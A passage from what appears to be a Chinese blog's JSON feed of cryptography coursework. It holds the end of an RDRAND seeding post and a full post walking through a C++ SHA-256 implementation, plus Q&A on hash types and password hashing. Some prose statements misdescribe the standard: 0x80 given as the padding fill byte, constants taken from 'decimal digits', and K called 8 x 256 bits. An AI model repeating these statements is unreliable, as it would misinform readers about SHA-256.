%0;\\n&quot;</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"string\">&quot;setc %1&quot;</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    : <span class=\"string\">&quot;=r&quot;</span>(randomValue), <span class=\"string\">&quot;=r&quot;</span>(status)</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    :</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    : <span class=\"string\">&quot;cc&quot;</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  )</span></span>;</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(xSeed + i * <span class=\"number\">8</span>, &amp;randomValue, <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>RDRAND 指令一次生成 64 bits 大小的随机数，生成 4 次获得所需的 32 字节随机种子。</p>\n<h1 id=\"其他优化可能\"><a class=\"anchor\" href=\"#其他优化可能\">#</a> 其他优化可能</h1>\n<p>上课时老师讲过利用中国剩余定理优化，主要原理是分解使得计算 2048 bits 的有限域运算变成更小的有限域运算，可以很大程度上提升性能，在大数库实现过程也看得到，随着运算规模增大，时间开销的增长并不只是线性增长的，2048 bits 的时间开销比 1024 bits 大了远不止两倍。但是输入并没有给我 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">n=pq</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span> 的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span>，这个优化也没法用。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/sha-256/",
            "url": "https://taf.fyi/math/cryptography/sha-256/",
            "title": "SHA-256",
            "date_published": "2024-12-04T16:00:00.000Z",
            "content_html": "<h1 id=\"算法流程\"><a class=\"anchor\" href=\"#算法流程\">#</a> 算法流程</h1>\n<h2 id=\"扩展对齐\"><a class=\"anchor\" href=\"#扩展对齐\">#</a> 扩展对齐</h2>\n<p>给定输入都是按字节对齐的，也就是 8bits 的倍数，但不一定是 SHA-256 要求的 512bits 的倍数，需要补位或者扩展。</p>\n<p>补位对齐的工作不是在一开始做好的，因为输入数据量可能很大，一次性将所有数据读入程序内存空间是不合适的，而 SHA-256 工作本身就是分组迭代，所以 512bits = 64B 为单位（块）读入，每次处理完 64B 再读取下一个块的数据。只有在读最后一个块的时候，需要视情况补位扩展：</p>\n<ul>\n<li>最后一个块大小小于等于 56 个字节，那么最后 8 个字节填入 64bits 无符号编码的原始数据字节为单位的长度，其余字节补  <code>0x80</code></li>\n<li>否则当前块剩余字节补  <code>0x80</code> （当然如果刚好最后一个块是 512bits 就不补，但后面的工作还要做），然后处理完当前块之后再补一个块，这一块最后 8 个字节填入 64bits 无符号编码的原始数据字节为单位的长度，其余字节补  <code>0x80</code></li>\n</ul>\n<p>综上，再考虑处理一个读入数据的时候还不知道这一块是不是最后一块，可以这样处理：不管原始数据有多长，先读取数据并处理一个块，然后判断读取数据长度，如果等于 64B，那么继续读取数据并处理一个块然后判断读取数据长度，否则按照上面的补位扩展处理。</p>\n<p>所以我在程序实现的时候使用  <code>do&#123;...&#125;while(...)</code>  循环结构，来实现这样的逻辑：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint64_t</span> bytesRead = <span class=\"number\">0</span>, totalBytesRead = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">uint8_t</span> * bytesTotalBytesRead = (<span class=\"type\">uint8_t</span> *)(&amp;totalBytesRead);</span><br><span class=\"line\"><span class=\"type\">uint8_t</span> bytes[<span class=\"number\">64</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">    bytesRead = <span class=\"built_in\">fread</span>(bytes, <span class=\"number\">1</span>, <span class=\"built_in\">sizeof</span>(bytes), stdin);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bytesRead == <span class=\"number\">64</span>) &#123;</span><br><span class=\"line\">        totalBytesRead += <span class=\"number\">64</span>;</span><br><span class=\"line\">        <span class=\"built_in\">hashRounds</span>(bytes);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (bytesRead &lt;= <span class=\"number\">55</span>) &#123;</span><br><span class=\"line\">        totalBytesRead = (totalBytesRead + bytesRead) * <span class=\"number\">8</span>;</span><br><span class=\"line\">        bytes[bytesRead] = <span class=\"number\">0x80</span>;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(bytes + bytesRead + <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">63</span> - bytesRead);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">8</span>; ++i)&#123;  <span class=\"comment\">/* 这个循环比较特殊 */</span></span><br><span class=\"line\">            bytes[i + <span class=\"number\">56</span>] = bytesTotalBytesRead[<span class=\"number\">7</span> - i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">hashRounds</span>(bytes);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">uint8_t</span> bytes_end[<span class=\"number\">64</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        totalBytesRead = (totalBytesRead + bytesRead) * <span class=\"number\">8</span>;</span><br><span class=\"line\">        bytes[bytesRead] = <span class=\"number\">0x80</span>;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(bytes + bytesRead + <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">63</span> - bytesRead );</span><br><span class=\"line\">        <span class=\"built_in\">hashRounds</span>(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">8</span>; ++i)&#123;  <span class=\"comment\">/* 这个循环比较特殊 */</span></span><br><span class=\"line\">            bytes_end[i + <span class=\"number\">56</span>] = bytesTotalBytesRead[<span class=\"number\">7</span> - i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">hashRounds</span>(bytes_end);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">while</span> (</span><br><span class=\"line\">    bytesRead == <span class=\"number\">64</span></span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure></p>\n<p>上面的注释我指出了 2 个特殊的循环，在这两个循环我相当于将  <code>bytesTotalBytesRead</code>  的大小端模式反了过来存到  <code>bytes</code>  或  <code>bytes_end</code> ，这是有原因的，我在后面会提到。</p>\n<p><code>hashRounds</code>  就是 SHA-256 更标准的描述中的轮函数，这个函数的功能就是根据 512bits = 64B 输入更新 256bits 签名或者哈希值结果。</p>\n<h2 id=\"初始值与常量\"><a class=\"anchor\" href=\"#初始值与常量\">#</a> 初始值与常量</h2>\n<p>算法根据每一个块对哈希值进行更新，而初始的哈希值则是一个固定的值，它来自自然数中前 8 个素数二次方根的小数部分里十进制下的前十位，定义如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint32_t</span> H[<span class=\"number\">8</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0x6a09e667</span>, <span class=\"number\">0xbb67ae85</span>, <span class=\"number\">0x3c6ef372</span>, <span class=\"number\">0xa54ff53a</span>, <span class=\"number\">0x510e527f</span>, <span class=\"number\">0x9b05688c</span>, <span class=\"number\">0x1f83d9ab</span>, <span class=\"number\">0x5be0cd19</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>每一轮更新都还需要一个 8 x 256bits 大小的常量 K，它来自自然数中前 64 个素数三次方根的小数部分里十进制下的前十位，定义如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> K[<span class=\"number\">64</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0x428a2f98</span>, <span class=\"number\">0x71374491</span>, <span class=\"number\">0xb5c0fbcf</span>, <span class=\"number\">0xe9b5dba5</span>, <span class=\"number\">0x3956c25b</span>, <span class=\"number\">0x59f111f1</span>, <span class=\"number\">0x923f82a4</span>, <span class=\"number\">0xab1c5ed5</span>,</span><br><span class=\"line\">    <span class=\"number\">0xd807aa98</span>, <span class=\"number\">0x12835b01</span>, <span class=\"number\">0x243185be</span>, <span class=\"number\">0x550c7dc3</span>, <span class=\"number\">0x72be5d74</span>, <span class=\"number\">0x80deb1fe</span>, <span class=\"number\">0x9bdc06a7</span>, <span class=\"number\">0xc19bf174</span>,</span><br><span class=\"line\">    <span class=\"number\">0xe49b69c1</span>, <span class=\"number\">0xefbe4786</span>, <span class=\"number\">0x0fc19dc6</span>, <span class=\"number\">0x240ca1cc</span>, <span class=\"number\">0x2de92c6f</span>, <span class=\"number\">0x4a7484aa</span>, <span class=\"number\">0x5cb0a9dc</span>, <span class=\"number\">0x76f988da</span>,</span><br><span class=\"line\">    <span class=\"number\">0x983e5152</span>, <span class=\"number\">0xa831c66d</span>, <span class=\"number\">0xb00327c8</span>, <span class=\"number\">0xbf597fc7</span>, <span class=\"number\">0xc6e00bf3</span>, <span class=\"number\">0xd5a79147</span>, <span class=\"number\">0x06ca6351</span>, <span class=\"number\">0x14292967</span>,</span><br><span class=\"line\">    <span class=\"number\">0x27b70a85</span>, <span class=\"number\">0x2e1b2138</span>, <span class=\"number\">0x4d2c6dfc</span>, <span class=\"number\">0x53380d13</span>, <span class=\"number\">0x650a7354</span>, <span class=\"number\">0x766a0abb</span>, <span class=\"number\">0x81c2c92e</span>, <span class=\"number\">0x92722c85</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa2bfe8a1</span>, <span class=\"number\">0xa81a664b</span>, <span class=\"number\">0xc24b8b70</span>, <span class=\"number\">0xc76c51a3</span>, <span class=\"number\">0xd192e819</span>, <span class=\"number\">0xd6990624</span>, <span class=\"number\">0xf40e3585</span>, <span class=\"number\">0x106aa070</span>,</span><br><span class=\"line\">    <span class=\"number\">0x19a4c116</span>, <span class=\"number\">0x1e376c08</span>, <span class=\"number\">0x2748774c</span>, <span class=\"number\">0x34b0bcb5</span>, <span class=\"number\">0x391c0cb3</span>, <span class=\"number\">0x4ed8aa4a</span>, <span class=\"number\">0x5b9cca4f</span>, <span class=\"number\">0x682e6ff3</span>,</span><br><span class=\"line\">    <span class=\"number\">0x748f82ee</span>, <span class=\"number\">0x78a5636f</span>, <span class=\"number\">0x84c87814</span>, <span class=\"number\">0x8cc70208</span>, <span class=\"number\">0x90befffa</span>, <span class=\"number\">0xa4506ceb</span>, <span class=\"number\">0xbef9a3f7</span>, <span class=\"number\">0xc67178f2</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"轮函数\"><a class=\"anchor\" href=\"#轮函数\">#</a> 轮函数</h2>\n<p>每一轮更新，初始化 8 个 word（32B）  <code>a,b,c,d,e,f,g,h</code>  为  <code>H[8]</code>  的 8 个 word。然后循环迭代如下过程 64 轮：</p>\n<p><img data-src=\"/assets/math/cryptography/sha-256/1.png\" alt=\"\" width=\"60%\" /></p>\n<p>更详细准确的计算过程如下：</p>\n<p><img data-src=\"/assets/math/cryptography/sha-256/2.png\" alt=\"\" width=\"60%\" /></p>\n<p>64 轮需要 64 个字  <code>w</code> ，也就是需要一个  <code>w[64]</code> ，它的前 16 个字来自输入的 512bits = 16x32bits，其剩余 56</p>\n<p>这里  <code>&gt;&gt;&gt;</code>  表示循环右移，可以通过两次位移拼接实现，例如 n 位的 k 可以通过如下方式实现：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x &gt;&gt;&gt; k = ((x &gt;&gt; k) | (x &lt;&lt; (n-k))</span><br></pre></td></tr></table></figure></p>\n<p>最后经过 64 轮迭代后，再将  <code>a,b,c,d,e,f,g,h</code>  分别加到  <code>H[8]</code>  的 8 个 word，作为这一轮更新结束的签名或哈希值。</p>\n<p>代码实现如下，输入是 64x8B = 512bits ：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">hashRounds</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * bytes)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> w[<span class=\"number\">64</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; ++i)&#123;  <span class=\"comment\">/* 这个循环比较特殊 */</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; ++j)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">memcpy</span>((<span class=\"type\">uint8_t</span> *)w + <span class=\"number\">4</span> * i + j, bytes + <span class=\"number\">4</span> * i + <span class=\"number\">3</span> - j, <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">16</span>; i &lt; <span class=\"number\">64</span>; ++i)&#123;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> s0 = ((w[i - <span class=\"number\">15</span>] &gt;&gt; <span class=\"number\">7</span>) | (w[i - <span class=\"number\">15</span>] &lt;&lt; <span class=\"number\">25</span>)) ^ ((w[i - <span class=\"number\">15</span>] &gt;&gt; <span class=\"number\">18</span>) | (w[i - <span class=\"number\">15</span>] &lt;&lt; <span class=\"number\">14</span>)) ^ (w[i - <span class=\"number\">15</span>] &gt;&gt; <span class=\"number\">3</span>);</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> s1 = ((w[i - <span class=\"number\">2</span>] &gt;&gt; <span class=\"number\">17</span>) | (w[i - <span class=\"number\">2</span>] &lt;&lt; <span class=\"number\">15</span>)) ^ ((w[i - <span class=\"number\">2</span>] &gt;&gt; <span class=\"number\">19</span>) | (w[i - <span class=\"number\">2</span>] &lt;&lt; <span class=\"number\">13</span>)) ^ (w[i - <span class=\"number\">2</span>] &gt;&gt; <span class=\"number\">10</span>);</span><br><span class=\"line\">        w[i] = w[i - <span class=\"number\">16</span>] + s0 + w[i - <span class=\"number\">7</span>] + s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> a = H[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> b = H[<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c = H[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> d = H[<span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> e = H[<span class=\"number\">4</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> f = H[<span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> g = H[<span class=\"number\">6</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> h = H[<span class=\"number\">7</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> s1, ch, t1, s0, maj, t2;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; ++i)&#123;</span><br><span class=\"line\">        s1 = ((e &gt;&gt; <span class=\"number\">6</span>) | (e &lt;&lt; <span class=\"number\">26</span>)) ^ ((e &gt;&gt; <span class=\"number\">11</span>) | (e &lt;&lt; <span class=\"number\">21</span>)) ^ ((e &gt;&gt; <span class=\"number\">25</span>) | (e &lt;&lt; <span class=\"number\">7</span>));</span><br><span class=\"line\">        ch = (e &amp; f) ^ ((~e) &amp; g );</span><br><span class=\"line\">        t1 = h + s1 + ch + K[i] + w[i];</span><br><span class=\"line\">        s0 = ((a &gt;&gt; <span class=\"number\">2</span>) | (a &lt;&lt; <span class=\"number\">30</span>)) ^ ((a &gt;&gt; <span class=\"number\">13</span>) | (a &lt;&lt; <span class=\"number\">19</span>)) ^ ((a &gt;&gt; <span class=\"number\">22</span>) | (a &lt;&lt; <span class=\"number\">10</span>));</span><br><span class=\"line\">        maj = (a &amp; b) ^  (a &amp; c) ^ (b &amp; c);</span><br><span class=\"line\">        t2 = s0 + maj;</span><br><span class=\"line\">        h = g;</span><br><span class=\"line\">        g = f;</span><br><span class=\"line\">        f = e;</span><br><span class=\"line\">        e = d + t1;</span><br><span class=\"line\">        d = c;</span><br><span class=\"line\">        c = b;</span><br><span class=\"line\">        b = a;</span><br><span class=\"line\">        a = t1 + t2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    H[<span class=\"number\">0</span>] += a;</span><br><span class=\"line\">    H[<span class=\"number\">1</span>] += b;</span><br><span class=\"line\">    H[<span class=\"number\">2</span>] += c;</span><br><span class=\"line\">    H[<span class=\"number\">3</span>] += d;</span><br><span class=\"line\">    H[<span class=\"number\">4</span>] += e;</span><br><span class=\"line\">    H[<span class=\"number\">5</span>] += f;</span><br><span class=\"line\">    H[<span class=\"number\">6</span>] += g;</span><br><span class=\"line\">    H[<span class=\"number\">7</span>] += h;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上面的注释我指出了 2 个特殊的循环，在这两个循环我相当于将输入 64x8B = 512bits 为大小的块，以 1 word = 4B 为单位将大小端模式反了过来作为  <code>w[64]</code>  的前 16 个字。</p>\n<p>这里和前面处理扩展补位一样，都是因为 SHA-256 算法中，进行移位、循环移位等操作都是对一个 word 操作，而我为了方便使用  <code>uint32_t</code>  作为一个 word 直接用 C++ 基本运算处理，现代处理器基本都是小端存储，存入  <code>uint32_t</code>  的时候需要保持和算法大端存储模式描述的一致，就得这样操作。</p>\n<blockquote>\n<p>这个问题也是我 debug 了好几个小时才发现的</p>\n</blockquote>\n<p>当然最终输出  <code>H</code>  的时候，也需要类似的处理将小端存储描述的结果转化为大端存储描述的结果。</p>\n<h1 id=\"一些可能的优化\"><a class=\"anchor\" href=\"#一些可能的优化\">#</a> 一些可能的优化</h1>\n<h2 id=\"simd-优化\"><a class=\"anchor\" href=\"#simd-优化\">#</a> SIMD 优化</h2>\n<p>这里我没有实现，只是想到有这个方案，因为 Intel x86_64 提供了这样的指令集家族 SHA，可以直接硬件加速整个 SHA-256 算法。我在网上找到这样一个开源实现：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmlvL3NoYTI1Ni1zaW1k\">https://github.com/minio/sha256-simd</span></li>\n</ul>\n<p>这个实现中使用汇编调用了 SHA 指令集。</p>\n<h2 id=\"并行优化\"><a class=\"anchor\" href=\"#并行优化\">#</a> 并行优化</h2>\n<p>SHA-256 的更新过程中 64 轮迭代依赖于上一轮迭代，无法实现并行。同样的轮函数依赖于上一轮的结果，也无法实现并行。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjQwODgyOTUvY2FuLXNoYTEtc2hhLTI1Ni1zaGEtNTEyLWJlLWJyb2tlbi11cC10by1ydW4tYWNyb3NzLW11bHRpcGxlLWNvcmVzLXRocmVhZHM=\">https://stackoverflow.com/questions/24088295/can-sha1-sha-256-sha-512-be-broken-up-to-run-across-multiple-cores-threads</span></p>\n<p>但是对每一个块的预处理，也就是  <code>w[64]</code>  的生成是相互独立的，还是可以并行化的。</p>\n<h1 id=\"思考题\"><a class=\"anchor\" href=\"#思考题\">#</a> 思考题</h1>\n<h2 id=\"问题-1\"><a class=\"anchor\" href=\"#问题-1\">#</a> 问题 1</h2>\n<p>SHA-1 的初始常数是很有规律的  <code>0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0</code> ，SHA-256 的初始常数和轮常数分别来自于前几个素数的平方根 / 立方根的小数部分。为什么要这么设计？</p>\n<h3 id=\"回答\"><a class=\"anchor\" href=\"#回答\">#</a> 回答</h3>\n<p>平方根和立方根本身具有良好的数学性质，确保生成的常数在运算中能够提供良好的混合性和扩散性。这对于哈希函数的安全性至关重要，因为它们需要确保输入的微小变化能导致输出的巨大变化。</p>\n<h2 id=\"问题-2\"><a class=\"anchor\" href=\"#问题-2\">#</a> 问题 2</h2>\n<p>有一类 hash 算法被称为 “Non-cryptographic hash function”，例如 <a href=\"https://github.com/openjdk/jdk/blob/ac2fede165e0ecbfa51f5cc75a3218c51e3528be/src/java.base/share/classes/jdk/internal/util/ArraysSupport.java#L362\">Java (OpenJDK) 中  <code>hashCode</code>  的实现</a> 是非常简单的迭代计算  <code>h = 31 * h + x</code> ，其他的此类算法包括 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pc3RoZS5jb20vY2hvbmdvL3RlY2gvY29tcC9mbnYvaW5kZXguaHRtbA==\">FNV</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhcHBsZWJ5L3NtaGFzaGVy\">MurmurHash</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0N5YW40OTczL3h4SGFzaA==\">xxHash</span> 等。它们与 MD5、SHA-1、SHA-256 等 hash 算法的区别是什么？它们有哪些主要用途？为什么会比 SHA-256 等等更适合用于这些场景？</p>\n<h3 id=\"回答-2\"><a class=\"anchor\" href=\"#回答-2\">#</a> 回答</h3>\n<ul>\n<li>非加密哈希函数：主要用于快速的数据散列和分布，优化性能，适用于哈希表、数据去重等场景。它们不具备防篡改或安全性的特性，具有更高的计算速度和更低的内存占用，因为它们的算法设计较为简单，优化了性能。另外非加密哈希函数在设计时并不考虑碰撞抵抗性，可能会存在多个输入映射到同一输出的现象。</li>\n<li>加密哈希函数：旨在确保数据的完整性和安全性，具有抗碰撞性、抗篡改性等特性，适用于数字签名、密码保护等安全应用。另外还确保不同输入几乎不可能产生相同的哈希值。</li>\n</ul>\n<h2 id=\"问题-3\"><a class=\"anchor\" href=\"#问题-3\">#</a> 问题 3</h2>\n<p>如果你需要设计一个用户系统，你也许知道数据库中不应该以明文存储用户的密码（遗憾的是，我国的知名计算机技术社区 CSDN 就犯过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXdzLnNpbmEuY29tLmNuL28vMjAxMS0xMi0yMi8wNDQ1MjM2NzM1ODguc2h0bWw=\">这样的错误</span>），而应该存储密码的 hash。但是，在这种情况下直接使用 SHA-256 等等仍然是不推荐的。有哪些 hash 算法更适合用来处理密码？它们与 SHA-256 等等有什么区别？</p>\n<h3 id=\"回答-3\"><a class=\"anchor\" href=\"#回答-3\">#</a> 回答</h3>\n<ul>\n<li><strong>bcrypt</strong>：是一个基于 Blowfish 加密算法的哈希函数，它设计为慢速哈希，具有可调节的工作因子，可以随时间增加计算复杂度。通过增加计算时间来抵御暴力破解和字典攻击。</li>\n<li><strong>scrypt</strong>：旨在防止专用硬件（如 ASIC）进行暴力破解，使用大量内存和计算资源。由于其内存强度，scrypt 对抗并行计算攻击（如 GPU 和 ASIC）效果更好。</li>\n<li><strong>Argon2</strong>：具有高效的内存使用和可调节的时间复杂度。具备高度的安全性和灵活性，支持多种配置以应对不同的攻击场景。</li>\n</ul>\n<p>它们与 SHA-256 的区别：SHA-256 是一种快速的哈希函数，设计目标是高效计算，但也使得暴力破解（即快速尝试大量候选密码）变得可行。而 bcrypt、scrypt 和 Argon2 则故意设计为较慢，以增加破解的难度，使得暴力破解的成本显著提高。</p>\n<h2 id=\"问题-4\"><a class=\"anchor\" href=\"#问题-4\">#</a> 问题 4</h2>\n<p>在比特币中，有一类节点的功能是将交易数据打包成区块附加到区块链上，而我们常说的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saWFveHVlZmVuZy5jb20vYm9va3MvYmxvY2tjaGFpbi9iaXRjb2luL21pbmluZy8=\"> “挖矿”</span>，其基本原理就是不断变换区块中的 nonce 字段，使整个区块的 SHA-256（当成一个 256 bit 的大整数）小于比特币网络当前规定的难度值。<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXRoZXJkcmVhbS5jb20vRnVubnlTY3JpcHQvZ2xtaW5lci9nbG1pbmVyLmh0bWw=\">glminer</span> 是一个由 <span class=\"exturl\" 